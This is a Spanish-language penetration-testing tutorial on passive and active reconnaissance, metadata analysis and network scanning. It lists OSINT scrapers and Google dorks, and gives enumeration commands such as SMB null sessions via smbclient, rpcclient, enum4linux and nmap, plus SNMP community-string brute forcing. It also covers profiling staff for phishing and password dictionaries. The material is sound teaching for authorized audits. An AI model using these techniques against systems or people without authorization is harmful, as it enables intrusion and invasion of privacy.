Durante el reconocimiento pasivo se buscará información relativa, entre otras cosas a: nombres de dominio; direcciones IP; organizaciones con las que se relaciona; tecnologías empleadas; infraestructura de red; direcciones de correo; nombres de empleados, sus cargos e información personal de los mismos. Asimismo, es necesario obtener cuanta información sea posible de cómo funciona la organización, sus ubicaciones físicas (sobre todo en el caso de que el test de penetración incluya una parte física), su estructura jerárquica, el área de negocio de la organización, la terminología empleada por personal de la organización. Para ello, las herramientas que se utilizarán serán comunes y al alcance de cualquiera:  

- Buscadores web.
- Redes sociales.
- Reconocimiento de números de teléfonos.
- Foros. 
- Aplicaciones colaborativas.
- Ofertas de empleo.
- Bases de datos offline.
- Búsqueda de metadatos en archivos.

Estos aspectos se tratarán en los siguientes apartados, pero antes de entrar en ellos es necesario mencionar una técnica que aunque parezca antigua, hoy en día puede seguir proporcionando información interesante. Se dice que "la basura de uno es el tesoro de otro" y esto es especialmente cierto en el mundo de la ciberseguridad, donde se ha adoptado el término "Durnpster diving" para definir algo que se ha realizado toda la vida: buscar en la basura para obtener información útil sobre la organización o sobre el personal de la misma o sus clientes.

**Redes sociales**  
Este tipo de sitios se crearon con el fin de facilitar las relaciones sociales entre los usuarios a los que permiten y animan a incluir y compartir información personal o empresarial de toda índole. 

Dado que actualmente existen numerosos tipos de redes sociales, se abre un gran abanico de posibilidades a la hora de recopilar información sobre los intereses personales de los usuarios de un determinado objetivo. Además, dado que existen redes sociales dedicadas a establecer contactos en el mundo laboral, también es posible recopilar datos de las posibles tecnologías utilizadas en la empresa. 

La mayoría de redes sociales permiten buscar información acerca de otros usuarios aunque en la actualidad restringen parte de esta información a los usuarios no registrados. El tipo de Información, que se puede recopilar en las redes sociales, que puede ser útil para un atacante es el siguiente.  

- **Datos de contacto:** Nombre completo y dirección de correo que nos pueden ayudar para enumerar usuarios o para realizar ataques de Phishing.
- **Intereses personales:** Intereses personales de los usuarios pueden servirnos de ayuda para diseñar campañas de phishing e ingeniería social mucho más específicos a los usuarios de nuestro objetivo. También podemos utilizar esta información para generar un diccionario de posibles contraseñas basadas en los intereses de estos usuarios (aficiones, nombre de equipo deportivo, ciudades...)
- **Tecnologías utilizadas en la empresa:** Podremos comprobar si se usa alguna tecnología susceptible de presentar alguna vulnerabilidad y conocer los mecanismos de defensa que pueda tener la compañía.

**Herramientas**  

- **twitterscrapper:** Recopila información de todo los datos expuestos en una cuenta de twitter. Ya sean tweets, retweets, hashtags, lista de favoritos, información pública del perfil, etc. Útil para conocer las inquietudes de una determinada persona para realizar labores de ingeniería social, o incluso generar diccionarios de posibles contraseñas basadas en sus aficiones. Información útil para ingeniería social o generar diccionarios de contraseñas.
- **Ultimate Facebook Scrapper:** Herramienta para recopilar datos de un perfil de Facebook tales como videos, fotos, lista de amigos, estados, mensajes en el muro, etc. Útil para conocer las inquietudes de una determinada persona para realizar labores de ingeniería social, o incluso generar diccionarios de posibles contraseñas basadas en sus aficiones.
- **Osintgram:** Herramienta que permite recolectar información de un usuario a través de línea de comandos. La información se puede obtener de cuentas públicas o de cuentas a las que se sigue.
- **scrapedin crawler:** Recopila información de los perfiles de LinkedIn, útil para extraer información de las tecnologías utilizadas en una determinada organización.

**Reconocimiento de números de teléfonos**

El reconocimiento de números de teléfono es algo más complejo, por lo que será difícil de obtener información relevante a partir de un número. Además, depende en gran medida del país al que pertenece el número.

**Herramientas**

- **Phoneinfoga:** permite obtener información del tipo de línea, del propietario y del proveedor del servicio, entre otros datos.

**Aplicaciones colaborativas**  
Existen bastantes aplicaciones colaborativas que el personal de tecnología utiliza en su día a día para compartir información, o consultar dudas a cerca de una determinada plataforma tecnológica. Si en estas aplicaciones o portales de consulta se indica información sensible, fragmentos de código de una aplicación interna, dudas sobre una determinada tecnología, o incluso credenciales de usuario o claves de API. Esta información puede ser accesible por un tercero. 

Las más utilizadas son StackOverflow y Pastebin. 

El tipo de Información, que se puede recopilar en las redes sociales, que puede ser útil para un atacante es el siguiente.  

- **Tecnologías utilizadas en la organización:** Podremos comprobar si se usa alguna tecnología susceptible de presentar alguna vulnerabilidad y conocer los mecanismos de defensa que pueda tener la compañía.
- **Porciones de código o información sensible:** Podremos obtener información sensible escrita en el código, localizar alguna vulnerabilidad a nivel de código. Librerías utilizadas.
- **Credenciales de usuario:** En ocasiones también se pueden localizar la divulgación de credenciales de usuario en el código o que se las pasan abiertamente.
- **APIKEYS:** Claves para el uso de ciertas APIS internas o incluso de pago, nos pueden servir para poder utilizar una API como si fuéramos el usuario y expandir nuestras posibilidades de ataque.

**Herramientas**  

- **pastehunter:** Herramienta que realiza búsquedas en pastebin buscando información sensible o fragmentos de código. _**PasteHunter**_.
- **shhgit:** Herramienta para buscar información sensible en GitHub, encuentra credenciales, APIKeys, ficheros de configuración, etc. _**shhgit**_.

**Buscadores Web**  
Utilizaremos buscadores para buscar información pública relacionada con la empresa o dominio que queremos auditar, así como posibles páginas de desarrollo/pruebas que no debieron haberse indexado. 

Es aconsejable consultar las opciones avanzadas (operadores avanzados de búsqueda) soportadas por los distintos buscadores con el fin de precisar las búsquedas obteniendo así mejores resultados. 

A continuación se enumeran los buscadores más utilizados junto con sus principales características.  

- **Google:** Uno de los buscadores más utilizados, tiene numerosos operadores de búsqueda para realizar búsquedas avanzadas.  

Google es, sin lugar a dudas, el mayor indexador de contenidos de internet. Dado esta característica. ¿Por qué no aprovecharla para obtener más información sobre el objetivo? Para poder afinar las búsquedas se pueden utilizar los operadores de Google que permiten realizar búsquedas más precisas. En el siguiente enlace tenéis una recopilación de los operadores de Google que podréis utilizar en las busquedas (https://www.googleguide.com/advanced_operators_reference.html).

Por otro lado, existen ciertas búsquedas específicas compuesta de varios operadores de búsqueda para localizar cierta información sobre tecnologías o información sensible que estuviera indexada. A este tipo de búsquedas tan específicas se les conoce como Google dorks y existe una base de datos "Google Hacking Database" (https://www.exploit-db.com/google-hacking-database) que se nutre de los aportes de la comunidad, que recopila gran cantidad de Google dorks.

**Operadores**  
De todos los posibles operadores que ofrece google para restringir las búsquedas a continuación se enumeran los más utilizados.

- **site:** Este operador permite indicar el nombre de un sitio o un dominio sobre el que se limitarán las búsquedas. Por ejemplo: _site:sitioejemplo.es_ Se pueden combinar diferentes operadores para acotar más la búsqueda. Los resultados de las búsqueda también cambiarán según se utilicen o no comillas, por lo que puede resultar interesante probar distintas formas de buscar. Por ejemplo: 

```bash
site:"sitioejemplo.es" intext:"windows"
```

- **related:** Este operador se utiliza para buscar páginas con un contenido similar a la página que se indica el nombre de un sitio o un dominio sobre el que se harán las búsquedas. En muchas ocasiones no devolverá nada de interés, pero puede servir para encontrar alguna relación entre organizaciones en función del contenido de sus sitios web o los hipervinculos existentes. Por ejemplo, si se buscan los sitios relacionados con un banco cualquiera, se encontrarán páginas de otras entidades. Por ejemplo: _related:bancoejemplo.es_
- **link:** Busca únicamente en páginas que tienen un enlace a un sitio web. Por ejemplo: 

```bash 
link:sitioejemplo.es
```

- **intitle:** Con este operador se restringen las búsquedas a palabras en el titulo de la página. Este operador resulta muy útil para localizar sitios web que muestren el índice de archivos y carpetas ubicados en un directorio, lo que permitirá a un atacante acceder a información sensible. Por ejemplo: 

```bash
intitle:index.of "parent directory"
```

- **inurl:** Este operador busca de manera especifica direcciones URL que contengan un texto determinado. Se puede utilizar para buscar scripts correspondientes a implementaciones de sitios web con vulnerabilidades conocidas. En el siguiente ejemplo se busca una extensión concreta de WordPress con vulnerabilidades conocidas y se refina la búsqueda para encontrar archivos que permitan identificar la versión. Por ejemplo: 

```bash
inurl:wp-content/plugins/my-calendar changelog
```

- **intext:** Este operador busca exclusivamente en el texto de la página. Por ejemplo: _intext:windows_ Uno de los elementos más interesantes a buscar durante la fase de reconocimiento son archivos (ofimáticos o de otro tipo), no solamente por su contenido, sino por los metadatos que puedan contener. Para poder analizar los metadatos es necesario disponer previamente de los archivos y los buscadores web facilitan la búsqueda, dado que identifican distintos tipos de archivos en función de su extensión.
- **filetype:** En Google este operador se comporta igual que el operador **ext**, lo que permite buscar archivos si Google los ha identificado por su extensión. Si este operador se utiliza sin aplicar un mayor filtrado, en muchas ocasiones Google no devolverá resultados. El operador **site** visto anteriormente es uno de los operadores que se suelen combinar con este, puesto que permite buscar archivos concretos en un sitio especifico. Por ejemplo: 

```bash
filetype:xlsx site:google.es
```

Además de combinar varios operadores en la barra de búsquedas, estos se pueden modificar para excluir elementos de búsquedas concretas. Para ello se antepondrá un guion delante. Por ejemplo, la siguiente búsqueda se limitará al sitio sitioejemplo.es y mostrará todas las páginas indexadas que no contengan en su texto la palabra Windows: 

```bash
site:sitioejemplo.es -intext:windows  
```

- **Bing:** Buscador de Microsoft. La principal diferencia de este buscador con los demás es que permite realizar búsquedas basadas en direccionamiento IP.
- **DuckDuckGo:** Al igual que google, también permite utilizar operadores avanzados de búsqueda.
- **Censys:** Este buscador parecido a shodan se utiliza principalmente para buscar dominios que compartan el mismo certificado, o que tengan ciertos datos en el certificado expedido (Empresa, dominio, etc.)
- **Archive.org:** Este buscador tiene indexadas versiones antiguas de las páginas a lo largo de varios años. De esta manera podremos comprobar tecnologías que se estuvieran utilizando, parámetros de entrada o páginas que aunque no se encuentren enlazadas puedan estar presentes, etc.
- **Shodan:** Es un buscador que en vez de indexar páginas web indexa tecnologías y servicios publicados en internet, pudiendo realizar búsquedas por una versión concreta de un determinado software, o por todas las tecnologías de una determinada organización, etc.

Shodan es muy útil para realizar un filtrado rápido de sistemas publicados. Por ejemplo, en el supuesto de localizarse una vulnerabilidad para una versión específica del servidor web Apache, podría realizarse una búsqueda en shodan para comprobar todos los sistemas que estuvieran expuestos con esa versión concreta del software.  

Disponemos de varios operadores que nos permiten acotar las búsquedas. A continuación se enumeran los más utilizados.  

**Operadores**  

- **city:** Filtro para buscar dispositivos que se encuentren en una determinada ciudad o área.
- **country:** Igual que el anterior, pero en este caso el filtro se aplica por país.
- **geo:** búsqueda zona geográfica, según coordenadas de longitud y latitud.
- **hostname:** Busca sistemas cuto nombre de host concuerde con el término de búsqueda (WWW, FTP, VPN, etc.).
- **net:** Limita los resultados de la búsqueda a una determinada dirección IP o subred específica.
- **os:** Filtra por un determinado sistema operativo.
- **port:** Filtra la búsqueda por un puerto específico. Útil para localizar servicios expuestos.

**Whois**  
Todas las direcciones IP públicas en internet han de estar registradas en las Bases de Datos Whois con la finalidad de conocer a quién pertenecen, persona de contacto rango de direccionamiento al que pertenecen, etc. Algunos de los datos que podemos consultar en las Bases de datos Whois son los siguientes:  

- Servidores DNS
- Registrador u organización
- Información de contacto

Estas bases de Datos se mantienen y gestionan por 5 organizaciones llamadas Regional Internet Registry (RIR) que se encuentran repartidas según su área geográfica.  

- **ARIN:** América del Norte
- **LACNIC:** América del Sur, América Central y Caribe
- **RIPE NCC:** Europa, el medio Este y Asia Central
- **APNIC:** Asia del Pacífico
- **AfriNIC:** Africa

**Herramientas**  
Existen diferentes herramientas que podemos utilizar para realizar consultas a las BBDD Whois, pero básicamente se pueden agrupar en las dos siguientes categorías:  

- **Herramientas whois de consola:** Herramienta en modo consola, es decir, accesible desde la línea de comandos. Existen versiones para Microsoft Windows y distribuciones Linux. _$ whois + dirección_IP_
- **Servicios web:** Existen diversos servicios web que facilitan la realización de estas consultas a través de aplicativos o portales en internet, por ejemplo (whois.domaintools.com). E incluso nos ofrecen la posibilidad de realizar búsquedas más específicas que por no soporta la herramienta whois.

**Email harvesting**  
Esta técnica consiste en la búsqueda de correos electrónicos pertenecientes a una determinada organización. De esta manera obtenemos correos electrónicos válidos para la realización de ciertas técnicas como ataques de fuerza bruta o password spraying, ingeniería social, envío de correos con malware, etc.  

- **TheHarvester:** Herramienta que recopila información sobre direcciones de correo electrónico de un determinado dominio. (Herramienta incluída en la distribución Kali)
- **Maltego:** Es toda una suite de búsqueda de relaciones entre entidades, utilizada en la rama de inteligencia. Es muy potente y entre otros muchas capacidades puede recopilar direcciones de correo electrónico. (Herramienta incluída en la distribución Kali)

**Foros**  
Existen numerosos foros donde se tratan temas técnicos donde los administradores de los sistemas suelen hacer preguntas acerca de configuraciones o problemas que se encuentran en su trabajo diario y es posible que revelen el nombre de su organización de manera inadvertida o intencionadamente, o que se les pueda relacionar de alguna manera con la misma. En este caso, a través de los foros se puede obtener información acerca de las tecnologías empleadas por una organización, e identificar alguna vulnerabilidad o mala configuración.

**Ofertas de empleo**  
En las ofertas de empleo para personal informático las organizaciones suelen relacionar las tecnologías que deben conocer los futuros empleados, por lo que son una buena fuente de información para un atacante, que únicamente tiene que leerlas para hacer una relación inicial de posibles tecnologías y herramientas, aunque deberá confirmarla y ampliarla posteriormente.

# **Reconocimiento Activo**

El reconocimiento activo se define como el proceso de recolección de información a cerca del objetivo de las pruebas, sin embargo, en este caso realizaremos consultas directas contra el objetivo. Es decir, estableceremos una comunicación con los sistemas remotos (que forman parte del alcance de la auditoría) para realizar estas consultas por lo que estamos dejando una traza en el objetivo. 

La información que se obtenga complementa toda la información que se hubiera podido recopilar en la fase del reconocimiento pasivo, debido a que habrá información específica que únicamente podrá ser extraída mediante consultas directas a los servicios expuestos. (DNS, SMTP, SNMP, SMB, etc.). 

En este caso, dado que se está realizando una iteración sobre ciertos activos, el objetivo puede ser consciente de que se está realizando cierta enumeración. Aunque esta posible detección siempre va a depender de las capacidades de monitorización y detección del objetivo. 

A continuación se enumeran distintas técnicas de reconocimiento pasivo:  

**Enumeración DNS**  
El servicio DNS (Domain Name System) es un protocolo que proporciona un esquema de nombres jerárquico, formando una estructura de tipo árbol, almacenados en una base de datos distribuida, y que permite realizar la traducción entre nombres de máquinas, fácilmente inteligibles para una persona, y direcciones IP, que son las que finalmente se utilizan para establecer y mantener las comunicaciones.

Las principales características de una enumeración DNS son las siguientes:  

- Dirección IP asociada a un host
- Principales servidores (NS, MX, SOA)
- Si se encuentra habilitado resolución inversa obtenemos nombre de host a partir de la IP
- En ocasiones se habilita la transferencia de zona

**Herramientas**  
Existen diferentes herramientas que podemos utilizar para realizar consultas a los  
servidores DNS. Mediante estas consultas podemos averiguar la dirección IP de un determinado host en un dominio. Además, en caso que el servidor DNS tenga habilitada la resolución de inversa, se puede obtener el nombre de host a partir de una determinada dirección IP. A continuación, se enumeran las herramientas más comunes para la realización de esta tarea.  

- **host, dig y nslookup:** Herramientas de consola que nos permite realizar consultas DNS de manera manual.
- **dnsrecon:** Herramienta en modo consola que automatiza todas las consultas que deberíamos realizar de manera manual con las herramientas anteriores proporcionándonos toda la información de manera estructurada.
- **dnsenum:** Además de todas las opciones de enumeración que proporciona dnsrecon también realiza operaciones de descubrimiento de host y subdominios mediante técnicas de fuerza bruta.

**Enumeración SMTP**  
SMTP es el protocolo que se encarga de gestionar la entrega de correos electrónicos. El protocolo dispone de varios comandos que permiten averiguar si un determinado usuario existe en el sistema remoto o en el dominio del objetivo. A continuación se indican los comandos de enumeración disponibles en el protocolo SMTP.  
 
**Comandos**  

- **RCPT:** Especifica a quién va dirigido el correo, el servidor puede indicar si el usuario de correo existe o no.
- **EXPN:** Identifica todos los usuarios que pertenecen a una determinada lista de correo.
- **VRFY:** Este comando permite verificar si una determinada dirección de correo es válida.

**Herramientas**  
Al igual que en los apartados anteriores, existen ciertas herramientas que nos permiten automatizar todo el proceso, utilizando los comandos anteriormente descritos del estándar, para enumerar usuarios.  

- **smtp-user-enum:** Herramienta que realiza enumeración de usuarios a través del protocolo SMTP.

**Enumeración SNMP**  
El protocolo SNMP habitualmente se utiliza para gestionar routers, switches, impresoras y demás dispositivos en una red local, aunque también puede ejecutarse en sistemas Windows y UNIX.  

Los dispositivos que implementan el servicio SNMP ejecutan un agente que conoce toda la información del dispositivo y la organiza jerárquicamente en forma de objetos en lo que se conoce como MIB.  

Para conectarse al agente existen dos roles/contraseñas (community strings), de forma predeterminada estas son “public” y “private”, permitiendo el primero el acceso al contenido de la MIB en modo lectura y el segundo en modo lectura/escritura.  

- **public:** Permite acceder a la configuración en modo consulta.
- **private:** Permite modificar la configuración del dispositivo.

Además, las versiones SNMPv1 y SNMPv2 del protocolo no establecen ningún tipo de filtrado del canal. Por tanto, en caso de poder interceptar las comunicaciones tanto las community string cómo todo el tráfico de configuración queda expuesto. La versión SNMPv3 del protocolo implementa numerosas mejoras en materia de seguridad pero todavía resulta común encontrar dispositivos que soportan las versiones anteriores.  

A continuación, se enumeran las principales características de la enumeración SNMP.  

- Obtener información de la configuración de dispositivos.
- Modificar la configuración de los dispositivos.

**Herramientas**  
Existen varias herramientas que nos permiten realizar ataques de fuerza bruta para averiguar el community string utilizado (lectura o incluso lectura-escritura), además de proporcionar una interfaz cli (desde la consola) por la que navegar a través de la estructura MIB o, en caso de disponer de la community string privada, modificar objetos en la MIB.  

- **onesixtyone:** Utiliza técnicas de fuerza bruta para averiguar los community strings que nos permiten acceder a los roles public y private.
- **snmpwalk:** En caso de disponer (o averiguar) las community string de acceso se puede acceder a la configuración de un dispositivo.

**Enumeración SMB**  
SMB es un protocolo de red, muy utilizado en redes Microsoft. Se utiliza para compartir archivos, impresoras, unidades, etc. Entre sistemas pertenecientes a una misma red.  

Este servicio se encuentra activo en los puertos TCP 139 y 445 y a través de él es posible extraer información detallada del sistema remoto que se encuentra utilizando el protocolo SMB.  

Además, existe una técnica conocida como “SMB null sessions” por la que se puede generar una conexión SMB entre dos sistemas informáticos sin realizar la autenticación sobre el protocolo. El establecimiento de esta conexión ya permite obtener cierta información a través del protocolo sin necesidad de conocer las credenciales de un usuario legítimo.  

A continuación se indica el tipo de información que se puede recopilar con este tipo de enumeración.  

- Política de contraseñas
- Nombre y SID de usuarios
- Nombre y SID de grupos
- Nombre y SID de equipos

**Herramientas**
Existen varias herramientas para obtener este tipo de información además de un script de nmap (Introduciremos esta herramienta en la fase de escaneo) que también puede ser utilizado para obtener la información  

- **nbtscan**: Realiza la conexión SMB con un sistema remoto y obtiene información disponible. 

```bash
nbtscan -r IP o subred
```

- **smbclient**: Esta herramienta es un cliente que permite acceder a recursos compartidos en servidores SMB o Samba. Cuando se ejecute se pueden especificar diferentes parámetros, lo que afectará a la información que se muestre, que también está condicionada por la versión de SMB utilizada en el servidor. Por ejemplo, en el improbable caso de que el servidor SMB permita las sesiones nulas, un usuario sin autenticar podrá obtener mucha información procedente del equipo.

```bash
smbclient -L IP
```

Esta herramienta permite abrir una conexión con un recurso compartido, en este ejemplo la carpeta tmp.

```bash
smbclient -U "" \\\\IP\\tmp
```

La herramienta admite más parámetros, por lo que resulta conveniente consultar el manual de la misma.

- **rpcclient**: Se trata de otra herramienta incluida en la suite de Samba que permite interactuar con el equipo. Esta herramienta permite la utilización de comandos para obtener información del servidor o del dominio al que pertenezca el equipo, siempre y cuando se disponga de unas credenciales válidas o si el servidor permite las sesiones nulas.

Si el equipo permite sesiones nulas, el siguiente comando abrirá una sesión.

```bash
rpcclient -U "" IP
```

- **enum4linux**: Herramienta que establecen una sesión SMB con el sistema remoto y recupera la información disponible.

```bash
enum4linux -a IP
```

Con el siguiente comando se mostrará información de los recursos compartidos.

```bash
enum4linux -S IP
```

Entre sus parámetros están los siguientes:

- **-U:** obtener lista de usuarios.
- **-S:** obtener lista de shares. 
- **-G:** obtener grupos y sus miembros.
- **-P:** obtener política de contraseñas del sistema objetivo.
- **-r:** enumerar usuarios recorriendo RID secuencialmente.
- **-o:** obtener información del sistema operativo.
- **-n:** hace un nmblookup, similar a nbstat.
- **-i:** obtiene información sobre impresoras.
- **-u:** para especificar un nombre de usuario.
- **-p:** para especificar una contraseña.

- **smbmap**: Herramienta específica para enumerar shares (listar, consultar permisos, descargar y subir ficheros, soporte de expresiones regulares, etc...). Esta diseñada para tareas de pentesting y disponible en Kali.

Entre sus parámetros están los siguientes:

-  **-H:** para indicar la IP del host
- **-P:** para indicar el puerto SMB (por defecto es el 445)
- **-v:** proporciona información sobre la versión del SO.
- **-r:** para que, en caso de que tenga permiso, liste el contenido del share.
- **-u:** usuario.
- **-p:** contraseña.

```bash
smbmap -H IP -R
```

- **scripts nmap**: Nmap es una herramienta de análisis de red que proporciona capacidades de enumeración gracias a diversos scripts. Existen distintos scripts específicos de obtención de información en la herramienta nmap, únicamente hay que indicar que se incluyan estos scripts en las pruebas.

```bash
nmap -p 139,445 dirección_ip -sV --script=smb-*
```

# **Análisis y Borrado de Metadatos**

Los archivos informáticos, ya sean documentos ofimáticos, fotografías, o cualquier otro tipo de archivo, se generan con distintas aplicaciones que añaden una información adicional estructurada en forma de metadatos, que no se muestran al usuario durante la visualización del documento. Esta información se refiere a aspectos relacionados con fechas formatos y formas de visualización, pero también existen metadatos que proporcionan más información que puede resultar muy útil para un atacante, por ejemplo:

- **Aplicación utilizada para la generación del documento.** No solamente el nombre, sino que además puede informar de la versión utilizada en el momento de crear el archivo. Esto le sirve a un atacante para conocer posibles vulnerabilidades y preparar vectores de ataque para ataques client-side.
- **Nombres de usuario.** Usuarios que han creado y modificado el documento. Según cómo se generen en la organización, puede proporcionar directamente el nombre de usuarios en el sistema, o simplemente puede proporcionar información acerca del nombre y apellidos de los mismos. En cualquiera de los casos, se trata de una información valiosa para un atacante.
- **Direcciones de correo electrónico.** Nuevamente, una información muy útil para un atacante, que la puede utilizar para realizar ataques utilizando ingeniería social.
- **Rutas en las que se han creado.** Algunos metadatos proporcionan información acerca de la ruta del archivo cuando se generó en el sistema, lo que puede proporcionar información acerca de nombres de directorio que pueden resultar de interés para un atacante.

Los metadatos pueden resultar necesarios para una organización porque facilitan las búsquedas y facilitar la integración de los archivos en repositorios centralizados, entre otros aspectos beneficiosos. Sin embargo, una exposición pública de archivos con metadatos puede suponer una fuga indeseada e inconsciente de información que puede resultar sensible.  

Prácticamente todos los tipos de archivos contendrán algún tipo de metadato, por lo que no merece la pena hacer un listado minucioso de extensiones de archivos potencialmente útiles. De manera general, a un atacante le interesarán archivos pdf, archivos html, distintos tipos de archivos de imagen (jpg, jpeg, etc.) y documentos ofimáticos tanto Microsoft Office (.docx, .dot, .doc, .xlsx, .xls, .pptx, .ppt, etc.) como del estándar OpenDocument (.odt, .odf, .ods, .odp etc.), pero intentará obtener información de los metadatos de todos los tipos de archivo que pueda encontrar.  

Para poder extraer los metadatos de los archivos es necesario obtener previamente los archivos. Además de a través de las búsquedas en Internet vistas anteriormente, existen herramientas que permiten automatizar la búsqueda y descarga de archivos en los sitios web de la organización e, incluso, permiten automatizar todo el proceso de búsqueda, descarga de archivos y análisis de metadatos.

**Obtención de archivos con wget**  
Aunque la forma más sigilosa para descargar archivos es a través de una navegación normal por la página web, se trata de un proceso lento y en ocasiones no se encontrarán todos los archivos, por lo que resulta bastante útil conocer algunas técnicas y herramientas que faciliten el trabajo.  

Una de las herramientas más sencillas es wget. Se trata de una herramienta libre y gratuita que permite realizar descargas desde servidores web utilizando múltiples parámetros para delimitar las descargas, lo que permite configurarlas para especificar los tipos de archivo a buscar e indicar que la búsqueda se realice de manera recursiva. En el siguiente ejemplo se buscarán en el dominio indicado todos los archivos de las extensiones indicadas (-A), de manera recursiva (-r) y se almacenarán en la ruta indicada (-P) sin crear subdirectorios (-nd):  

```bash
wget -r -nd -A pdf,docx,xlsx,pptx -P ruta
```  

Cuando termine la ejecución se habrán descargado en la ruta indicada todos los archivos que cumplan con lo indicado.

**Análisis de metadatos con Exiffool**  
Se trata de una herramienta gratuita multiplataforma desarrollada en Perl por Phil Harvey, pensada para leer, crear y modificar metadatos en archivos de múltiples formatos. La instalación de Exiftool es muy sencilla, para Windows y MacOs se puede encontrar en la web de la herramienta (https://exiftool.org/), y para Linux basta con instalar desde los repositorios el paquete libimage-exiftool-perl.  

Una vez instalada la herramienta, para visualizar los datos basta con ejecutarla indicando el nombre del archivo.

```bash
exiftool nombredearchivo
```

**Análisis de Metadatos con FOCA**  
Se trata de una aplicación para Windows desarrollada por Eleven Paths, que permite llevar a cabo la descarga de archivos de un dominio, así como el análisis de los mismos para buscar metadatos. La información obtenida a partir de los metadatos se muestra de manera en la herramienta de manera ordenada y agrupada por categorías.  

La descarga se puede realizar a través del enlace de descarga de la herramienta (https://github.com/ElevenPaths/FOCA), donde se pueden encontrar varias versiones de la herramienta y su código fuente. La herramienta no precisa instalación y para utilizarla sólo se requiere descargar y descomprimir un archivo .zip, pero para poder ejecutarla es necesario disponer de un servidor SQL Server al que conectarla. Este servidor SQL puede ser cualquier versión, incluidas las versiones Express, y no tiene por qué estar instalado en el mismo equipo en el que se ejecuta la FOCA, pero en este caso será preciso indicar la cadena de conexión cuando se inicie la herramienta.

La primera acción a realizar cuando se ejecuta la herramienta es crear un proyecto. Una vez indicados el nombre del proyecto y el dominio, se puede comenzar la búsqueda de archivos, para lo que es necesario seleccionar los motores de búsqueda que se van a utilizar, así como los tipos de archivo buscados. La herramienta irá mostrando todos los archivos encontrados, así como información de los servidores y de los dominios. En este caso se encuentran numerosos archivos, a pesar de que Google y DuckDuckGo están rechazando las peticiones.

Para descargar archivos se pueden seleccionar uno o varios archivos y seleccionar la opción de descargar que se muestra en el menú contextual. Los archivos descargados se indicarán con un punto verde, en lugar de una cruz roja. Una vez descargados los archivos, nuevamente con el menú contextual se pueden extraer los metadatos de los archivos seleccionados o de todos ellos.

A medida que la extracción de metadatos encuentra información, va agrupándola en los diferentes nodos del árbol de la izquierda. La cantidad de información encontrada dependerá de lo cuidadosos que hayan sido en la organización a la hora de hacer públicos sus archivos.  

**Ver y Borrar los Metadatos en Windows**  
Para borrar los metadatos de haz clic sobre el archivo con el botón derecho y elige la opción “Propiedades”. En la ventana que se abre a continuación clica en “Detalles” para ver los metadatos que acompañan a ese documento. El resultado será similar a lo mostrado en la siguiente imagen:

<div align="center">
  <img src="imagenes/ver-metadatos.png" alt="" width="485">
</div>

Los metadatos los vas a poder borrar desde esa misma ventana de propiedades. Lo único que tienes que hacer es ir a la parte inferior de la ventana y pulsar sobre el enlace _Quitar propiedades e información personal_. Al hacerlo se te abrirá una ventana en la que, arriba del todo, debes seleccionar la opción *Quitar las siguientes propiedades de este archivo.

Cuando eliges esta opción verás que en esa misma ventana, al lado de cada una de las propiedades te aparecerá un cuadro para seleccionarlas. Esto te permite ir seleccionando individualmente cada una de las opciones que quieres borrar de las propiedades del archivo. También tienes una opción _Seleccionar todo_ para que automáticamente queden todas las opciones marcadas.

Una vez hayas elegido todas las opciones que quieras eliminar sólo tienes que hacer click en aceptar.

# **Fase de escaneo (Fingerprinting)**

La fase de escaneo se realiza después de realizar la fase de reconocimiento.

En ella tratamos de obtener más información sobre el propósito de los activos incluidos en el alcance de las pruebas.

Se averigua los distintos componentes de la infraestructura, el rol que desempeña cada activo, el número de servicios y versiones de los mismos que se encuentran prestando servicio en cada activo.  

Además, también se realiza un análisis de las posibles vulnerabilidades existentes en el sistema tomando como referencia las versiones de los servicios que el activo sustenta así como la versión del Sistema Operativo.  

De esta manera podremos localizar “Vulnerabilidades públicas” que afecten a las versiones localizadas en los activos de la auditoría.

**Tipos de escaneo**  
Los distintos tipos de escaneo se pueden englobar en tres grandes bloques dependiendo del objetivo de los mismos.  

- **Escaneo de red:** Este tipo de escaneos están destinados a obtener mayor información sobre la red objetivo, direccionamiento IP y la arquitectura utilizada para sustentar toda la infraestructura objetivo.

En este tipo de escaneos, el objetivo principal es tener una visión de la infraestructura de red incluida en el alcance de las pruebas (Redes al alcance, subredes de la infraestructura, red de servidores, etc.), así como identificar dispositivos conectados y sus sistemas operativos (Elementos de red como switches y routers, o sistemas como servidores, impresoras, equipos informáticos). Las técnicas a utilizar en el escaneo y los resultados obtenidos dependen de manera directa si el escaneo se está realizando sobre la infraestructura interna (red privada de la organización) o si se está realizando sobre el perímetro externo (segmento de red que la organización tiene publicado en internet).  
  
A continuación, se introducen varias herramientas de escaneo de red así como su uso básico y que tipo de información son capaces de obtener.

- **Wireshark / tcpdump**

Son dos motores de análisis de los datos transmitidos en una comunicación que circulan por la red. Aunque no son herramientas que realicen labores de escaneo, se utilizan para poder capturar y analizar los paquetes que circulan por la  
red.  

Aunque la mayor parte de la comunicación que veremos con estas herramientas será con origen o destino el equipo del auditor, también veremos numeroso tráfico broadcast (dirigido a todos los equipos de la red) que nos puede brindar información interesante como si existen otras subredes, si existen distintas VLAN dentro de la infraestructura, etc.  

En ningún caso se realiza ningún tipo de comunicación por parte del auditor. Simplemente se limita a observar el tráfico que se transmite por la red. De esta manera se suele considerar esta técnica como una técnica “pasiva”.

- **netdiscover**

La herramienta net discover permite el descubrimiento de equipos remotos mediante mensajes broadcast de tipo ARP Discovery (como los vistos en wireshark). Esta herramienta recopila información de las direcciones IP observadas mediante la monitorización del tráfico ARP de tipo broadcast y te indica las direcciones IP observadas.  

Dado el funcionamiento del protocolo, es una técnica que únicamente suele funcionar desde una perspectiva de escaneo interna.  

```bash
netdiscover -i eth0
```

- **arp-scan**

Permite el descubrimiento de equipos remotos mediante mensajes broadcast de tipo ARP discovery, permite indicar la interfaz de red desde dónde se quiere realizar el escaneo.  

Las consultas de tipo “ARP Discovery”, consiste realizar una petición de consulta ARP, en todo el dominio de broadcast, si alguien tiene asignada una dirección IP en concreto. Si alguno de los equipos tiene asignada la dirección IP solicitada, le responde al equipo que realizó la consulta.  

Dado el funcionamiento del protocolo, es una técnica que únicamente suele funcionar desde una perspectiva de escaneo interna.

```bash
arp-scan red_a_escanear
```

- **nmap como escáner de red**

La herramienta nmap puede ser utilizada en los tres tipos de categorías de escaneo (Escaneo de red, escaneo de servicios y escaneo de vulnerabilidades), en este caso particular veremos su uso como escáner de red.  

Podemos utilizar nmap para poder realizar escaneos de una red objetivo, con la finalidad de comprobar los equipos activos en la red y la dirección IP que tienen asignada.  

De esta manera, es necesario conocer el direccionamiento de red sobre el que queremos realizar la consulta (netdiscover o wireshark pueden ayudarnos a obtener esta información).  

